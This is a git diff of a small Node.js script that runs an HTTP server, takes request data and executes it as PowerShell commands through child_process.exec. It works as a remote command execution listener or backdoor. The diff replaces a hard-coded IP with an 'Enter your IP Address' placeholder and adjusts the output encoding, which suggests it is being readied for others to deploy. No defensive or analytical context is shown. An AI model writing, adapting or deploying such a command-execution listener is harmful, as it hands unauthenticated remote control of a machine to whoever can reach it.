@@ -1,7 +1,7 @@
 const http = require('http')
 const cp = require('child_process')
 
-let hostname = '192.168.43.168';
+let hostname = 'Enter your IP Address';
 let port = 80;
 
 let server = http.createServer((req,res)=>{
@@ -19,7 +19,7 @@ let server = http.createServer((req,res)=>{
             console.log(data);
             cp.exec(data,{
                 shell:"powershell.exe",
-                encoding:"utf-8"},(err,sout,serr)=>{
+                encoding:"utf8"},(err,sout,serr)=>{
                     if(err) console.log(err.message);
                     output = (serr);
                     output += (sout);
